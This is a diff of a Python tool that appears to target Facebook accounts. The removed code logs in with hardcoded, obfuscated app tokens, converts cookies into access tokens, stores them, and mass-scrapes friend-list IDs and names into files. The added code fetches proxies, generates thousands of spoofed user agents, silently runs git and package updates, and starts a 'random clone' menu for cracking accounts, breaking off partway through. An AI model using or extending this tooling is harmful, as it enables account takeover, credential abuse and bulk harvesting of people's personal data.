@@ -1,496 +1,312 @@
-#!/usr/bin/python3
-import os,re,random,uuid,subprocess,requests,sys
-from os import system
-import time, json, string
-os.system('rm -rf .a.txt')
-#------(modules_install)------
+#follow my facebook page https://www.facebook.com/profile.php?id=100089747571096&mibextid=ZbWKwL
+#follow github https://github.com/Rdx337
+#join our fb grup https://www.facebook.com/groups/136091586257336/?ref=share_group_link/
+import os,sys,time,json,random,re,string,platform,base64,uuid
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup
+import requests as ress
+from datetime import date
+from datetime import datetime
+from time import sleep
+from os import system as s
+from time import sleep as waktu
 try:
-	import mechanize
-	br = mechanize.Browser()
-	br.set_handle_robots(False)
-	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-except:
-	os.system('pip install mechanize')
- 
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
+    os.system('pip install bs4')
+#-----------------color------------------
+#green
+gn ="\033[1;32m"
+#purple
+pn ="\033[1;35m"
+#blow
+bn = "\033[1;34m"
+#red
+rn = "\033[1;31m"
+#yello
+yn = "\033[1;33m"
+#coyn
+cn = "\033[1;36m"
+#white
+wn = "\033[1;37m"
+#-------------------------bragraund color -----------------
+red = '\033[1;41m'
+green = '\033[1;42m'
+yellow = '\033[1;43m'
 
-def clear():
-    if "linux" in sys.platform.lower():os.system("clear")
-    elif "win" in sys.platform.lower():os.system("cls")
-def animation(u):
-	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
-def back():
-    main_menu()
-def linex():
-	print('----------------------------------------------')
-def contact():
-	os.system('xdg-open https://www.facebook.com/profile.php?id=100089747571096&mibextid=ZbWKwL ')
-	back()
-G = "\u001b[32m"
-B = "\u001b[36m"
-W = "\033[1;37m"
-pemisah = '|'
-q="968"
-qq="8280"
-qqq="52729"
-qqqq="420"
-client_id = f"{qqqq}038{q}89{qq}485649{qqq}208"
-sim_hini = str(random.randint(2e4,4e4))
-trace_id = str(uuid.uuid4())
- 
+
+
+#end color
+ed = "\033[1;0m"
+
+RED = '\033[1;91m'
+WHITE = '\033[1;97m'
+GREEN = '\033[1;32m' 
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
+P = '\x1b[1;97m' 
+M = '\x1b[1;91m' 
+H = '\x1b[1;92m' 
+K = '\x1b[1;93m' 
+B = '\x1b[1;94m' 
+U = '\x1b[1;95m' 
+O = '\x1b[1;96m' 
+N = '\x1b[0m'    
+A = '\x1b[1;90m' 
+BN = '\x1b[1;107m' 
+BBL = '\x1b[1;106m' 
+BP = '\x1b[1;105m' 
+BB = '\x1b[1;104m' 
+BK = '\x1b[1;103m' 
+BH = '\x1b[1;102m' 
+BM = '\x1b[1;101m' 
+BA = '\x1b[1;100m' 
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today() 
+loop = 0
+oks = []
+cps = []
+ugen2=[]
+ugen=[]
+cokbrut=[]
+ses=requests.Session()
+princp=[]
+def __init__(self):
+        self.id = []
+        self.ok = []
+        self.cp = []
+        self.loop = 0
 try:
-	android = subprocess.check_output('getprop ro.product.brand', shell=True).decode('utf-8').replace('\n', '').upper()
-	model = subprocess.check_output('getprop ro.product.model', shell=True).decode('utf-8').replace('\n', '').upper()
-	carrier = '' + subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8').split(',')[1].replace('\n', '').upper()
-except:
-	android = random.choice(['TECNO', "INFINIX", "SAMSUNG"])
-	model = random.choice(['LD2', "SM-J009", "SM-J505", "HOT12", "NOTE-11", "A5-PRO"])
-	carrier = '' + random.choice(['02', 'Oramge', 'EE', "At&", "MTN", "Cricket"])
+ prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+ open('.prox.txt','w').write(prox)
+except Exception as e:
+ print('')
+prox=open('.prox.txt','r').read().splitlines()
+for xd in range(10000):
+    a='Nokia'
+    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    c=random.randrange(1, 99)
+    d='/GoBrowser/'
+    e='1.6.0.'
+    f=random.randrange(1, 99)
+    uaku2=(f'{a}{b}{c}{d}{e}{f}')
+    ugen.append(uaku2)
+for ua in range(5000):
+      a='Mozilla/5.0 (Linux; Android'
+      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
+      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
+      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+      d=random.randrange(40,115)
+      e='0'
+      f=random.randrange(3000,6000)
+      g=random.randrange(20,100)
+      h='Mobile Safari/537.36'
+      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
+      ugen.append(ug)
+for ua in range(5000):
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['8','9','10','11','12','13','14','15'])
+	c='itel S661LP Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	d=random.randrange(40,115)
+	e='0'
+	f=random.randrange(3000,6000)
+	g=random.randrange(20,100)
+	h='Mobile Safari/537.36'
+	jubair=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
+	ugen.append(jubair)
+for ua in range(5000):
+    a='NokiaX'
+    b=random.randrange(1,9)
+    c='-0'
+    d=random.randrange(1,9)
+    e='/'
+    f=random.randrange(1,9)
+    g='.0 ('
+    h=random.randrange(1,12)
+    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
+    j='UNTRUSTED/'
+    k=random.randrange(1,3)
+    l='.0'
+    jubair=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
+    ugen.append(jubair)
 
-#/-----logo-----/
-sh = input("[√] YOUR NAME : ")
-logo = f""" |  \/  |   | |  / ____|     | |   | |   (_)       / ____|      
- | \  / | __| | | (___   __ _| |__ | |__  _ _ __  | (___  _ __  
- | |\/| |/ _` |  \___ \ / _` | '_ \| '_ \| | '__|  \___ \| '__| 
- | |  | | (_| |  ____) | (_| | |_) | |_) | | |     ____) | |    
- |_|  |_|\__,_| |_____/ \__,_|_.__/|_.__/|_|_|    |_____/|_|   
-     FILE MAKING 
-----------------------------------------------
-\x1b[0m[√] YOUR NAME  : {sh}
-[√] AUTHOR     : Md Sabbir Bhai
-[√] GITHUB     : Rdx337
+for ua in range(5000):
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['8','9','10','11','12','13','14','15'])
+	y=random.choice(['RMX3571','RMX3710','RMX3461','RMX3741','RMP2107','RMX3572','RMX1921','RMX3121','RMX3121','RMX3350','RMX3511'])
+	c='Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	d=random.randrange(40,115)
+	e='0'
+	f=random.randrange(3000,6000)
+	g=random.randrange(20,100)
+	h='Mobile Safari/537.36'
+	jubair=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
+	ugen.append(jubair)
+os.system('clear')
+print(f'{cn}plisee wait for update..................{gn} ')
+os.system('git pull')
+os.system('pkg update && pkg upgrade')
+print(f'\033[1;33m{rn}follow my Facbook id{yn}.................{ed}')
+#os.system("xdg-open https://www.facebook.com/profile.php?id=100089747571096&mibextid=ZbWKwL/")
+# LOGO
+logo = (f'''                                                 
+                                                    
 
-[√] TOOL TYPE  : FILE MAKING
-----------------------------------------------
-\033[38;5;196m USE THIS TOOL FOR EDUCATION PURPOSE ONLY    
-     HACKING IS ILLEGAL IN ALL COUNTRY      \x1b[0m 
-----------------------------------------------"""
- 
-class login():
-	def __init__(self):
-		ids=[]
-	def lo_epa(self):
-		system('clear')
-		print(logo)
-		em = input(' PUT ID/EMAIL : ')
-		ps = input(' PUT PASSWORD : ')
-		e="5990"
-		ee="655"
-		eee="59"
-		tok1 = f"2377{e}9{eee}1{ee}"
-		ei="0f140aabedfb65"
-		ei2="a2263b1"
-		tok2 = f"25257C{ei}ac27a739ed1{ei2}"
-		us = f'Mozilla/5.0 (Linux; Android {str(random.randint(4,11))}.0; Nexus 5 Build/MRA{str(random.randint(30,60))}N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 Edg/111.0.{str(random.randint(1600,1661))}.41'
-		br.addheaders = [('User-Agent', us)]
-		li = "b-ap"
-		lo = "od/auth.l"
-		op="3f555f98"
-		op2 = "d7aa0c"
-		op3="58f522efm"
-		sig=f"{op}fb61fc{op2}44f{op3}"
-		p = br.open(
-			'https://'+li+'i.facebook.com/meth'+lo+'ogin?access_token='+tok1+'%'+tok2+'&format=json&sdk_version=1&email=' + em + '&locale=en_US&password=' + ps + '&sdk=ios&generate_session_cookies=1&sig='+sig+'')
-		po = json.load(p)
-		if 'access_token' in po:
-			toke=po['access_token']
-			linex()
-			animation(f' [{B}•{W}] LOGIN DONE RERUN ')
-			open('.token.txt','w').write(toke)
-			exit()
-		else:
-			if 'www.facebook.com' in po['error_msg']:
-				print('\033[1;33m ACCOUNT IS IN CHECKPOINT\033[0m')
-				exit(em+'|'+ps)
-			else:
-				linex()
-				exit('\033[1;31m WORNG ID/EMAIL OR PASSWORD\033[0m')
-	def login_epa2(self):
-		system('clear');
-		print(logo)
-		cooke = input(' cookie : ')
-		cookie = {'Cookie': cooke}
-		xyz = requests.session()
-		data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038', 'scope': ''}
-		req = xyz.post('https://graph.facebook.com/v16.0/device/login/', data=data).json()
-		cd = req['code']
-		ucd = req['user_code']
-		url = 'https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038' % (
-			cd)
-		req = bs(xyz.get('https://mbasic.facebook.com/device', cookies=cookie).content, 'html.parser')
-		raq = req.find('form', {'method': 'post'})
-		dat = {'jazoest': re.search('name="jazoest" type="hidden" value="(.*?)"', str(raq)).group(1),
-			   'fb_dtsg': re.search('name="fb_dtsg" type="hidden" value="(.*?)"', str(req)).group(1), 'qr': '0',
-			   'user_code': ucd}
-		rel = 'https://mbasic.facebook.com' + raq['action']
-		pos = bs(xyz.post(rel, data=dat, cookies=cookie).content, 'html.parser')
-		dat = {}
-		raq = pos.find('form', {'method': 'post'})
-		for x in raq('input', {'value': True}):
-			try:
-				if x['name'] == '__CANCEL__':
-					pass
-				else:
-					dat.update({x['name']: x['value']})
-			except Exception as e:
-				pass
-		rel = 'https://mbasic.facebook.com' + raq['action']
-		pos = bs(xyz.post(rel, data=dat, cookies=cookie).content, 'html.parser')
-		req = xyz.get(url, cookies=cookie).json()
-		if 'access_token' in req:
-			print(f' [{B}•{W}] LOGIN DONE RERUN ')
-			open('.token.txt', 'w').write(req['access_token'])
-			exit()
-		else:
-			exit('\033[1;31m INVALID COOKIE OR SOMETHING WENT WRONG')
-	def login_WALA(self):
-		system('clear');print(logo)
-		print(' [\u001b[36mA\033[1;37m] LOGIN WITH ID PASS   • WORKING ')
-		print(' [\u001b[36mB\033[1;37m] LOGIN WITH COOKIES   • NOT WORKING ')
-		print(' [\u001b[36mC\033[1;37m] ENTER TO BACK ')
-		linex()
-		menu = input(' SELECT OPTION >> ')
-		if menu in ['01', '1', 'A', 'a']:
-			login().lo_epa()
-		if menu in ['02', '2', 'B', 'b']:
-			login().login_epa2()
-		if menu in ['00', '0', 'C', 'c']:
-			back()
-		else:
-			linex()
-			animation(' [×] SELECT CORRECTLY ')
-			time.sleep(1)
-			login_WALA()
- 
-def main_menu():
-	os.system("clear");print(logo)
-	print(' [A] CREATE FILE SIMPLE ')
-	print(' [B] CREATE FILE UNLIMITED ')
-	print(' [C] REMOVE DUPLICATE IDz ')
-	print(' [D] REPORT GLITCH ')
-	print(' [E] LOGOUT')
-	linex()
-	xo = input(f' [√] CHOOSE OPTION : ')
-	if xo in ['01','1', 'A', 'a']:
-		file_create_menu().file_simple()
-	if xo in ['02','2', 'B', 'b']:
-		file_create_menu().file_unlimmited()
-	if xo in ['03','3', 'c', 'C']:
-		remove_dub()
-	if xo in ['04','4', 'D', 'd']:
-		contact()
-	if xo in ['00','0', 'E', 'e']:
-		os.system('rm -rf .token.txt')
-		linex()
-		animation(f" [√] DONE LOGOUT + DELETE COOKIE ")
-		exit()
-	else:
-		linex()
-		animation(' [×] SELECT CORRECTLY ')
-		time.sleep(1)
-		main_menu()
-siid=[]
-sep=[]
- 
-class file_create_menu():
-	def file_simple(self):
-		os.system('clear');print(logo)
-		try:
-			print(f' [•] WRITE FILE NAME WITHOUT /sdcard ')
-			nm  = input(f' [•] ENTER FILE NAME : ').replace(' ','_')
-			lk = '/sdcard/'
-			lok = '%s%s'%(lk,nm)
-			open(lok,'w')
-		except FileNotFoundError:
-			print(f' [×] LOCATION NOT FOUND TRY AGAIN !! ')
-			time.sleep(2)
-			back()
-		except IsADirectoryError:
-			time.sleep(1)
-			file_create_menu().file_simple()
-		if IOError:
-			pass
-			print(f' [•] PASTE UID ONE BY ONE ')
-			linex()
-			while True:
-				ids_all = input(f" [>] ENTER UID : ")
-				if ids_all == "":
-					linex()
-					print(f' [•] FILE SAVE AS : {lok} ')
-					input(f' [>] PRESS ENTER TO BACK ')
-					back()
-					break
-				try:
-					uid = ids_all.split("|")[0]
-				except:
-					uid = ids_all
-				try:
-					headers = {"X-Graphql-Client-Library": "graphservice", "X-Graphql-Request-Purpose": "fetch",
-							   "X-Fb-Privacy-Context": "2368177546817046", "X-Fb-Background-State": "1",
-							   "X-Fb-Net-Hni": "41001", "X-Fb-Sim-Hni": "41001",
-							   "Authorization": "OAuth "+self.token+"",
-							   "X-Fb-Session-Id": "nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9",
-							   "X-Fb-Connection-Type": "WIFI", "X-Fb-Device-Group": "4481", "X-Tigon-Is-Retry": "False",
-							   "X-Fb-Rmd": "cached=0;state=URL_ELIGIBLE", "X-Fb-Ta-Logging-Ids": f"graphql:{trace_id}",
-							   "X-Fb-Friendly-Name": "SuggestionsFriendListContentQuery",
-							   "X-Fb-Request-Analytics-Tags": "graphservice", "Priority": "u=0",
-							   "Accept-Encoding": "gzip, deflate", "X-Fb-Http-Engine": "Liger", "X-Fb-Client-Ip": "True",
-							   "X-Fb-Server-Cluster": "True", "X-Fb-Connection-Token": "ef0e330bff1cd312f36aa5f2c69c59a9",
-							   "Content-Type": "application/x-www-form-urlencoded", "Content-Length": "567"}
-					data = {
-						'User-Agent': '[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/' + carrier + ';FBMF/' + android + ' MOBILE LIMITED;FBBD/' + android + ';FBPN/com.facebook.katana;FBDV/' + model + ';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
-						'client_doc_id': client_id,
-						'method': 'post',
-						'locale': 'en_US',
-						'pretty': 'false',
-						'format': 'json',
-						'variables': '{"profile_id":' + uid + ',"suggestion_friends_paginating_first":2500}',
-						'fb_api_req_friendly_name': 'SuggestionsFriendListContentQuery',
-						'fb_api_caller_class': 'graphservice',
-						'fb_api_analytics_tags': '["At_Connection","GraphServices"]',
-						'client_trace_id': trace_id,
-						'server_timestamps': 'true',
-						'purpose': 'fetch'
-					}
-					posted = requests.post("https://graph.facebook.com/graphql", headers=headers, data=data).json()
-					try:
-						data = posted['data']['user']['friends']['edges']
-					except:
-						print(f' \033[1;35m SOMETHING WRONG WITH {uid}\033[0m ')
-					if len(data) < 100:
-						print(f' [×] PRIVATE FRIENDLIST OF {uid} ')
-						linex()
-					else:
-						for edge in data:
-							node = edge['node']
-							open(lok, 'a', encoding='utf-8').write(node['id'] + "|" + node['name'] + '\n')
-						try:
-							total_idss=len(open(lok,'r').readlines())
-						except:
-							total_idss='-'
-						print(f' [•] SUCESSFULLY EXTRACTED {uid} [{total_idss}] \033[0m')
-						linex()
-				except KeyError:
-					pass
-				except requests.exceptions.ConnectionError:
-					input(f" [×] CONNECTION ERROR - PRESS ENTER TO CONTINUE")
-	def __init__(self):
-		try:
-			os.system('.a.txt')
-			os.system('.temp.txt')
-			os.remove('.temp.txt')
-			os.remove('.a.txt')
-		except:
-			pass
-		self.ids = []
-		self.total = []
-		self.loop = 0
-		try:
-			self.token = open('.token.txt', 'r').read()
-			uid="100061689760374"
-			try:
-				headers = {"X-Graphql-Client-Library": "graphservice", "X-Graphql-Request-Purpose": "fetch",
-						   "X-Fb-Privacy-Context": "2368177546817046", "X-Fb-Background-State": "1",
-						   "X-Fb-Net-Hni": "41001", "X-Fb-Sim-Hni": "41001",
-						   "Authorization": "OAuth "+self.token+"",
-						   "X-Fb-Session-Id": "nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9",
-						   "X-Fb-Connection-Type": "WIFI", "X-Fb-Device-Group": "4481", "X-Tigon-Is-Retry": "False",
-						   "X-Fb-Rmd": "cached=0;state=URL_ELIGIBLE", "X-Fb-Ta-Logging-Ids": f"graphql:{trace_id}",
-						   "X-Fb-Friendly-Name": "SuggestionsFriendListContentQuery",
-						   "X-Fb-Request-Analytics-Tags": "graphservice", "Priority": "u=0",
-						   "Accept-Encoding": "gzip, deflate", "X-Fb-Http-Engine": "Liger", "X-Fb-Client-Ip": "True",
-						   "X-Fb-Server-Cluster": "True", "X-Fb-Connection-Token": "ef0e330bff1cd312f36aa5f2c69c59a9",
-						   "Content-Type": "application/x-www-form-urlencoded", "Content-Length": "567"}
-				data = {
-					'User-Agent': '[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/' + carrier + ';FBMF/' + android + ' MOBILE LIMITED;FBBD/' + android + ';FBPN/com.facebook.katana;FBDV/' + model + ';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
-					'client_doc_id': client_id,
-					'method': 'post',
-					'locale': 'en_US',
-					'pretty': 'false',
-					'format': 'json',
-					'variables': '{"profile_id":'+uid+',"suggestion_friends_paginating_first":2500}',
-					'fb_api_req_friendly_name': 'SuggestionsFriendListContentQuery',
-					'fb_api_caller_class': 'graphservice',
-					'fb_api_analytics_tags': '["At_Connection","GraphServices"]',
-					'client_trace_id': trace_id,
-					'server_timestamps': 'true',
-					'purpose': 'fetch'
-				}
-				posted = requests.post("https://graph.facebook.com/graphql", headers=headers, data=data).json()
-				if not posted['data']['user']['friends']['edges']:
-				    os.system('clear');print(logo)
-				    os.system('.token.txt')
-				try:
-					data = posted['data']['user']['friends']['edges']
-				except:
-					print(f' \033[1;31m SOMETHING WRONG WITH THIS ID \033[0m ')
-					os.system('.token.txt')
-					exit()
-			except Exception as e:
-				os.system('clear');print(logo)
-				print(f" [{B}×{W}] COOKIES EXPRIED !")
-				print(e)
-				login.login_WALA('')
-		except Exception as e:
-			print(e)
-			login.login_WALA('')
-	def file_unlimmited(self):
-		os.system('clear');print(logo)
-		limit = input(f" [{B}•{W}] HOW MANY UID YOU WANT TO ADD ? : ")
-		try:
-			print(f' [{B}•{W}] WRITE FILE NAME WITHOUT /sdcard ')
-			nm  = input(f' [{B}•{W}] ENTER FILE NAME : ').replace(' ','_')
-			lk = '/sdcard/'
-			lok = '%s%s'%(lk,nm)
-			open(lok,'w')
-		except FileNotFoundError:
-			print(f' [{B}×{W}] LOCATION NOT FOUND TRY AGAIN !! ')
-			time.sleep(2)
-			back()
-		except IsADirectoryError:
-			time.sleep(1)
-			file_create_menu().file_simple()
-		if IOError:
-			pass
-			os.system('clear');print(logo)
-			try:
-				file = open('.temp.txt', 'r').read().splitlines()
-			except:
-				file = []
-			os.system('clear');print(logo)
-			for i in range(int(limit)):
-				uid = input(" PUT UID {} : ".format(i+1))
-				try:
-					headers = {"X-Graphql-Client-Library": "graphservice", "X-Graphql-Request-Purpose": "fetch",
-							   "X-Fb-Privacy-Context": "2368177546817046", "X-Fb-Background-State": "1",
-							   "X-Fb-Net-Hni": "41001", "X-Fb-Sim-Hni": "41001",
-							   "Authorization": "OAuth " + self.token + "",
-							   "X-Fb-Session-Id": "nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9",
-							   "X-Fb-Connection-Type": "WIFI", "X-Fb-Device-Group": "4481", "X-Tigon-Is-Retry": "False",
-							   "X-Fb-Rmd": "cached=0;state=URL_ELIGIBLE", "X-Fb-Ta-Logging-Ids": f"graphql:{trace_id}",
-							   "X-Fb-Friendly-Name": "SuggestionsFriendListContentQuery",
-							   "X-Fb-Request-Analytics-Tags": "graphservice", "Priority": "u=0",
-							   "Accept-Encoding": "gzip, deflate", "X-Fb-Http-Engine": "Liger", "X-Fb-Client-Ip": "True",
-							   "X-Fb-Server-Cluster": "True", "X-Fb-Connection-Token": "ef0e330bff1cd312f36aa5f2c69c59a9",
-							   "Content-Type": "application/x-www-form-urlencoded", "Content-Length": "567"}
-					data = {
-						'User-Agent': '[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/' + carrier + ';FBMF/' + android + ' MOBILE LIMITED;FBBD/' + android + ';FBPN/com.facebook.katana;FBDV/' + model + ';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
-						'client_doc_id': client_id,
-						'method': 'post',
-						'locale': 'en_US',
-						'pretty': 'false',
-						'format': 'json',
-						'variables': '{"profile_id":' + uid + ',"suggestion_friends_paginating_first":2500}',
-						'fb_api_req_friendly_name': 'SuggestionsFriendListContentQuery',
-						'fb_api_caller_class': 'graphservice',
-						'fb_api_analytics_tags': '["At_Connection","GraphServices"]',
-						'client_trace_id': trace_id,
-						'server_timestamps': 'true',
-						'purpose': 'fetch'
-					}
-					posted = requests.post("https://graph.facebook.com/graphql", headers=headers, data=data).json()
-					try:
-						data = posted['data']['user']['friends']['edges']
-					except:
-						print(f' \033[1;35m SOMETHING WRONG WITH {uid}\033[0m ')
-					if len(data) < 100:
-						print(f' [{B}×{W}] PRIVATE FRIENDLIST OF {uid} ')
-					else:
-						for edge in data:
-							node = edge['node']
-							open('.a.txt', 'a', encoding='utf-8').write(node['id'] + '\n')
-							idss = len(open('.a.txt','r').readlines())
-						print(f' [{B}×{W}] SUCESSFULLY -> {uid} [{idss}]\033[0m')
-				except KeyError:
-					pass
-				except requests.exceptions.ConnectionError:
-					input(f" [{B}×{W}] CONNECTION ERROR - PRESS ENTER TO CONTINUE")
-			try:
-				file = open('.a.txt', 'r').read().splitlines()
-			except:
-				file = [] 
-			os.system('clear');print(logo)
-			print(f' [{B}√{W}] TOTAL ID TO EXTRACT : ' + str(len(file)))
-			print(f' [{B}√{W}] FILE SAVE AS : {lok} ')
-			print(f' [{B}√{W}] PRESS CTRL + Z TO STOP ')
-			linex()
-			for uid in file:
-				try:
-					headers = {"X-Graphql-Client-Library": "graphservice", "X-Graphql-Request-Purpose": "fetch",
-							   "X-Fb-Privacy-Context": "2368177546817046", "X-Fb-Background-State": "1",
-							   "X-Fb-Net-Hni": "41001", "X-Fb-Sim-Hni": "41001",
-							   "Authorization": "OAuth " + self.token + "",
-							   "X-Fb-Session-Id": "nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9",
-							   "X-Fb-Connection-Type": "WIFI", "X-Fb-Device-Group": "4481", "X-Tigon-Is-Retry": "False",
-							   "X-Fb-Rmd": "cached=0;state=URL_ELIGIBLE", "X-Fb-Ta-Logging-Ids": f"graphql:{trace_id}",
-							   "X-Fb-Friendly-Name": "SuggestionsFriendListContentQuery",
-							   "X-Fb-Request-Analytics-Tags": "graphservice", "Priority": "u=0",
-							   "Accept-Encoding": "gzip, deflate", "X-Fb-Http-Engine": "Liger", "X-Fb-Client-Ip": "True",
-							   "X-Fb-Server-Cluster": "True", "X-Fb-Connection-Token": "ef0e330bff1cd312f36aa5f2c69c59a9",
-							   "Content-Type": "application/x-www-form-urlencoded", "Content-Length": "567"}
-					data = {
-						'User-Agent': '[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/' + carrier + ';FBMF/' + android + ' MOBILE LIMITED;FBBD/' + android + ';FBPN/com.facebook.katana;FBDV/' + model + ';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
-						'client_doc_id': client_id,
-						'method': 'post',
-						'locale': 'en_US',
-						'pretty': 'false',
-						'format': 'json',
-						'variables': '{"profile_id":' + uid + ',"suggestion_friends_paginating_first":2500}',
-						'fb_api_req_friendly_name': 'SuggestionsFriendListContentQuery',
-						'fb_api_caller_class': 'graphservice',
-						'fb_api_analytics_tags': '["At_Connection","GraphServices"]',
-						'client_trace_id': trace_id,
-						'server_timestamps': 'true',
-						'purpose': 'fetch'
-					}
-					posted = requests.post("https://graph.facebook.com/graphql", headers=headers, data=data).json()
-					try:
-						data = posted['data']['user']['friends']['edges']
-					except:
-						print(f' \033[1;35m SOMETHING WRONG WITH {uid}\033[0m ')
-					if len(data) < 100:
-						print(f' [{B}×{W}] PRIVATE FRIENDLIST OF {uid} ')
-					else:
-						for edge in data:
-							node = edge['node']
-							open(lok, 'a', encoding='utf-8').write(node['id'] + "|" + node['name'] + '\n')
-						if 'y' in sep:
-							perfector(lok)
-						try:
-							total_idss=len(open(lok,'r').readlines())
-						except:
-							total_idss='-'
-						print(f' [{B}•{W}] SUCESSFULLY EXTRACTED {uid} [{total_idss}] ')
-				except KeyError:
-					pass
-				except requests.exceptions.ConnectionError:
-					input(f" [{B}•{W}] CONNECTION ERROR - PRESS ENTER TO CONTINUE")
-			print(' IDS SAVE IN {} path'.format(lok))
-			print(' TOTAL IDS SAVE IN FILE {} '.format(len(open(lok,'r').read().splitlines())))
-			input(' PRESS ENTER TO BACK ')
-			exit()
- 
-def remove_dub():
-    clear()
+ __       __        __         ______             __        __        __                   ______                  
+/  \     /  |      /  |       /      \           /  |      /  |      /  |                 /      \                 
+$$  \   /$$ |  ____$$ |      /$$$$$$  |  ______  $$ |____  $$ |____  $$/   ______        /$$$$$$  |  ______        
+$$$  \ /$$$ | /    $$ |      $$ \__$$/  /      \ $$      \ $$      \ /  | /      \       $$ \__$$/  /      \       
+$$$$  /$$$$ |/$$$$$$$ |      $$      \  $$$$$$  |$$$$$$$  |$$$$$$$  |$$ |/$$$$$$  |      $$      \ /$$$$$$  |      
+$$ $$ $$/$$ |$$ |  $$ |       $$$$$$  | /    $$ |$$ |  $$ |$$ |  $$ |$$ |$$ |  $$/        $$$$$$  |$$ |  $$/       
+$$ |$$$/ $$ |$$ \__$$ |      /  \__$$ |/$$$$$$$ |$$ |__$$ |$$ |__$$ |$$ |$$ |            /  \__$$ |$$ |            
+$$ | $/  $$ |$$    $$ |      $$    $$/ $$    $$ |$$    $$/ $$    $$/ $$ |$$ |            $$    $$/ $$ |            
+$$/      $$/  $$$$$$$/        $$$$$$/   $$$$$$$/ $$$$$$$/  $$$$$$$/  $$/ $$/              $$$$$$/  $$/             
+                                                                                                                   
+                                                                                                                   
+                                                                                                                 
+
+{yn}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━                                                    
+ {gn}Owner    : {cn}Md Sabbir Bhai{ed}
+ {gn}Guthub   : {cn}Rdx337{ed}
+ {gn}Facebook : {cn}MdSabbir Bhai{ed}
+ {gn}Taligram : {wn}https://t.me/jubairff{ed}
+ {gn}Tools    : {cn}RANK{pn} •{gn}[{cn}version \033[1;42m{rn}•3.6•{ed}{gn}]{ed}
+{yn}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{ed}''')
+# MAIN MANU 
+def Main():
+        os.system("clear")
+        print(logo)
+        print(" \033[1;35m[\033[1;32m1\033[1;35m] \033[1;33mRANDOM CLONE BD")
+        print(" \033[1;35m[\033[1;32m2\033[1;35m] \033[1;33mCONTACT ADMIN")
+        print(" \033[1;35m[\033[1;32m0\033[1;35m] \033[1;31mEXIT")
+        print(f"{yn}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        jubair =input("\n \033[1;35m[🌺\033[1;35m] \033[1;32mSELECTED YOUR OPTION : ")
+        if jubair in ["1","01"]:
+            sexy()
+        if jubair in ["2","02"]:
+        	os.system('xdg-open https://www.facebook.com/profile.php?id=100089747571096&mibextid=ZbWKwL')
+        if jubair in [" 0", "00"]:
+            exit()
+        else:
+            exit()     
+def sexy():
+    user=[]
+    os.system('clear')
     print(logo)
+    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    print('\033[1;32m[🌺\033[1;32m]\033[1;36m Example : \033[1;32m[\033[1;33m016\033[1;32m]\033[1;35m [\033[1;32m017\033[1;35m] \033[1;33m[\033[1;34m018\033[1;33m] \033[1;34m[\033[1;33m019\033[1;34m]')
